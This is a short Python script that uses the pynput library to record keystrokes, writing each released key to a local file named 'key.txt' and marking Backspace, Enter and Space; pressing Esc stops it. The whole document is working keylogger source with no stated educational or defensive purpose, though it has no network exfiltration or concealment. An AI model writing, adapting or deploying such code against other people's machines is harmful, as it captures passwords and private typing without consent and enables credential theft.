from pynput import keyboard 
import os

def on_press(key):
    if key == keyboard.Key.esc:
        listener.stop()            
        pass

    
def on_release(key):
    try:
        with open("key.txt",'a+') as f:
            if key == keyboard.Key.backspace:
                f.write("(Backspace)")
            elif key == keyboard.Key.enter:
                f.write("(Enter)")
            elif key == keyboard.Key.space:
                f.write("(Space)")
            else:
                f.write(key.char)
            f.flush()
            f.close()
    except AttributeError:
        pass

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
